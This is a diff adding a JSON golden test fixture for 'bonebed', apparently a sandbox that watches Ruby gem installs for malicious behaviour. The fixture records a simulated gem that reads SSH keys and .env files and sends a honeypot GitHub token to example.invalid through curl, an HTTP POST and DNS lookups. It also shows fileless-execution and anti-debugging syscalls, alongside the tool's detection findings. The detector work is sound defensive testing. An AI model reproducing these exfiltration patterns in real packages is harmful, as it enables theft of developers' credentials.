@@ -1,0 +1,511 @@
+{
+  "schema_version": 2,
+  "tool": {
+    "name": "bonebed",
+    "version": "<bonebed-version>",
+    "seccomp_notify": "<seccomp-notify-version>"
+  },
+  "run": {
+    "id": "golden-suspicious",
+    "started_at": "2026-01-02T03:04:05Z",
+    "mode": {
+      "offline": true,
+      "honeypot": true,
+      "env_profile": "ci",
+      "writes_only": false,
+      "real_home": false,
+      "cwd": null,
+      "enforce": null,
+      "repeat": 1,
+      "isolation": "syscall_fallback"
+    }
+  },
+  "started_at": "2026-01-02T03:04:05Z",
+  "gem": {
+    "name": "golden",
+    "version": "1.2.3",
+    "platform": "ruby",
+    "require_path": "golden",
+    "sha256": "ae97f0e5480e426428f68e63ecb0b661c60cee227bba7abe72950c3931ba163b",
+    "extensions": [
+      "ext/golden/extconf.rb"
+    ],
+    "executables": [
+      "golden"
+    ],
+    "required_ruby_version": ">= 3.2",
+    "post_install_message": "fixture message [CANARY:env:GITHUB_TOKEN]",
+    "rubygems_plugin": true,
+    "bundler_plugin": false
+  },
+  "phase": "install",
+  "environment": {
+    "ruby": "<ruby>",
+    "arch": "<arch>",
+    "kernel": "<kernel>",
+    "baseline_id": "golden-baseline-v1",
+    "cleanup": {
+      "mode": "cgroup_v2",
+      "completed": true,
+      "limitation": "same-UID cgroup controls are not a security boundary"
+    }
+  },
+  "target": {
+    "exit_status": 7,
+    "signal": null,
+    "timed_out": false
+  },
+  "files": {
+    "read": {
+      "self": [
+        "$GEM_HOME/gems/golden-1.2.3/lib/golden.rb"
+      ],
+      "resolver": [
+        "/etc/resolv.conf"
+      ],
+      "other": [
+        "$HOME/.ssh/id_ed25519",
+        "$PWD/.env",
+        "/proc/<pid>/status",
+        "/proc/<pid>/task/<tid>/status"
+      ]
+    },
+    "write": [
+      "$HOME/.cache/gem/specs/cache",
+      "$PWD/out",
+      "$PWD/new",
+      "$PWD/log",
+      "$PWD/state"
+    ],
+    "create": [
+      {
+        "path": "$PWD/new",
+        "count": 1
+      }
+    ],
+    "truncate": [
+      {
+        "path": "$PWD/out",
+        "length": 0,
+        "count": 1
+      }
+    ],
+    "append": [
+      {
+        "path": "$PWD/log",
+        "count": 1
+      }
+    ],
+    "rw": [
+      {
+        "path": "$PWD/state",
+        "count": 1
+      }
+    ],
+    "mkdir": [
+      {
+        "path": "$PWD/generated",
+        "count": 1
+      }
+    ],
+    "delete": [
+      {
+        "path": "$PWD/old",
+        "count": 1
+      }
+    ],
+    "rename": [
+      {
+        "from": "$PWD/source",
+        "to": "$PWD/destination",
+        "count": 1
+      }
+    ],
+    "chmod": [
+      {
+        "path": "$PWD/out",
+        "mode": 384,
+        "count": 1
+      }
+    ],
+    "chown": [
+      {
+        "path": "$PWD/out",
+        "uid": 1000,
+        "gid": 1000,
+        "count": 1
+      }
+    ],
+    "link": [
+      {
+        "from": "../../shared",
+        "to": "$PWD/link",
+        "symbolic": true,
+        "count": 1
+      }
+    ],
+    "notable": [
+      "$HOME/.ssh/id_ed25519",
+      "$PWD/.env",
+      "$PWD/log",
+      "$PWD/new",
+      "$PWD/out",
+      "$PWD/state"
+    ]
+  },
+  "network": [
+    {
+      "family": "inet",
+      "addr": "198.51.100.42",
+      "port": 443,
+      "count": 2
+    },
+    {
+      "family": "inet6",
+      "addr": "::1",
+      "port": 8080,
+      "count": 1
+    },
+    {
+      "family": "unix",
+      "path": "$HOME/control.sock",
+      "count": 1
+    },
+    {
+      "family": "vsock",
+      "cid": 42,
+      "port": 1024,
+      "count": 1
+    }
+  ],
+  "exec": [
+    {
+      "path": "/usr/bin/curl",
+      "argv": [
+        "curl",
+        "https://example.invalid/[CANARY:env:GITHUB_TOKEN]",
+        "--output=$PWD/out",
+        "/proc/<pid>/environ"
+      ],
+      "parent": "/usr/bin/ruby",
+      "argv_truncated": true,
+      "count": 2
+    }
+  ],
+  "threads": [
+    {
+      "syscall": "clone3",
+      "flags": 65536,
+      "count": 2
+    }
+  ],
+  "stats": {
+    "notify_roundtrips": 46,
+    "wall_ms": 0,
+    "open_total": 13,
+    "open_after_baseline": 10
+  },
+  "dependencies": [
+    {
+      "name": "alpha",
+      "version": "2.0"
+    },
+    {
+      "name": "zeta",
+      "version": "2.0"
+    }
+  ],
+  "errors": [
+    "native: RuntimeError: fixture target failure",
+    "target exited with status 7"
+  ],
+  "observer_errors": [
+    "decoder: ArgumentError: short socket data"
+  ],
+  "stdout": "token=[CANARY:env:GITHUB_TOKEN]\nbinary:�",
+  "stderr": "warning after truncation\n",
+  "stdout_truncated": true,
+  "stderr_truncated": true,
+  "network_intent": [
+    {
+      "protocol": "http",
+      "method": "POST",
+      "host": "example.invalid",
+      "path": "/token/[CANARY:env:GITHUB_TOKEN]",
+      "sample": "POST /token/[CANARY:env:GITHUB_TOKEN] HTTP/1.1\r\nHost: example.invalid\r\n\r\n"
+    },
+    {
+      "protocol": "tls",
+      "host": "tls.example.invalid"
+    }
+  ],
+  "canary_hits": [
+    {
+      "source": "env:GITHUB_TOKEN",
+      "seen_in": "gem"
+    },
+    {
+      "source": "env:GITHUB_TOKEN",
+      "seen_in": "exec"
+    },
+    {
+      "source": "env:GITHUB_TOKEN",
+      "seen_in": "stdout"
+    },
+    {
+      "source": "env:GITHUB_TOKEN",
+      "seen_in": "network_intent"
+    },
+    {
+      "source": "env:GITHUB_TOKEN",
+      "seen_in": "dns"
+    }
+  ],
+  "findings": [
+    {
+      "rule_id": "canary-exposed",
+      "severity": "critical",
+      "message": "Honeypot credential appeared in observed output or traffic",
+      "capability": "canary:env:GITHUB_TOKEN:dns",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "canary-exposed",
+      "severity": "critical",
+      "message": "Honeypot credential appeared in observed output or traffic",
+      "capability": "canary:env:GITHUB_TOKEN:exec",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "canary-exposed",
+      "severity": "critical",
+      "message": "Honeypot credential appeared in observed output or traffic",
+      "capability": "canary:env:GITHUB_TOKEN:gem",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "canary-exposed",
+      "severity": "critical",
+      "message": "Honeypot credential appeared in observed output or traffic",
+      "capability": "canary:env:GITHUB_TOKEN:network_intent",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "canary-exposed",
+      "severity": "critical",
+      "message": "Honeypot credential appeared in observed output or traffic",
+      "capability": "canary:env:GITHUB_TOKEN:stdout",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "credential-read",
+      "severity": "critical",
+      "message": "Credential file access",
+      "capability": "file:read:$HOME/.ssh/id_ed25519",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "credential-read",
+      "severity": "critical",
+      "message": "Credential file access",
+      "capability": "file:read:$PWD/.env",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "fileless-exec",
+      "severity": "critical",
+      "message": "Memory-backed or descriptor-based execution",
+      "capability": "syscall:memfd_create",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:dns:[CANARY:env:GITHUB_TOKEN].example.invalid",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:dns:service.example.invalid",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:http:example.invalid",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:inet6:[::1]:8080",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:inet:198.51.100.42:443",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:tls:tls.example.invalid",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:unix:$HOME/control.sock",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "install-network",
+      "severity": "high",
+      "message": "Network access during installation",
+      "capability": "network:vsock",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "raw-socket",
+      "severity": "high",
+      "message": "Raw or packet socket creation",
+      "capability": "socket:inet:3:255",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "external-command",
+      "severity": "medium",
+      "message": "External command execution",
+      "capability": "exec:/usr/bin/curl",
+      "allowed": false,
+      "references": []
+    },
+    {
+      "rule_id": "threads-spawned",
+      "severity": "info",
+      "message": "Thread creation",
+      "capability": "thread:spawn",
+      "allowed": false,
+      "references": []
+    }
+  ],
+  "process_tree": [
+    {
+      "pid": 7001,
+      "ppid": 7000,
+      "path": "/usr/bin/ruby",
+      "parent": null
+    },
+    {
+      "pid": 7002,
+      "ppid": 7001,
+      "path": "/usr/bin/curl",
+      "parent": "/usr/bin/ruby"
+    }
+  ],
+  "processes": [
+    {
+      "syscall": "clone3",
+      "flags": 0,
+      "count": 1
+    }
+  ],
+  "listen": [
+    {
+      "family": "inet",
+      "addr": "0.0.0.0",
+      "port": 8080,
+      "syscall": "bind",
+      "count": 1
+    },
+    {
+      "family": "inet",
+      "addr": "0.0.0.0",
+      "port": 8080,
+      "syscall": "listen",
+      "count": 1
+    }
+  ],
+  "sockets": [
+    {
+      "family": "inet",
+      "type": 3,
+      "protocol": 255,
+      "count": 1
+    }
+  ],
+  "suspicious": [
+    {
+      "syscall": "io_uring_setup",
+      "entries": 8,
+      "count": 1
+    },
+    {
+      "syscall": "memfd_create",
+      "name": "payload",
+      "flags": 1,
+      "count": 2
+    }
+  ],
+  "dns": [
+    {
+      "name": "[CANARY:env:GITHUB_TOKEN].example.invalid",
+      "count": 2
+    },
+    {
+      "name": "service.example.invalid",
+      "count": 1
+    }
+  ],
+  "anti_analysis": [
+    {
+      "syscall": "ptrace",
+      "request": 0,
+      "count": 1
+    },
+    {
+      "path": "/proc/<pid>/status"
+    }
+  ],
+  "capabilities": {
+    "network": true,
+    "dns": true,
+    "exec": true,
+    "process": true,
+    "threads": true,
+    "home_read": true,
+    "home_write": true,
+    "project_write": true,
+    "sensitive_read": true,
+    "native_extension": true,
+    "plugin": true,
+    "suspicious_syscalls": true,
+    "anti_analysis": true
+  }
+}
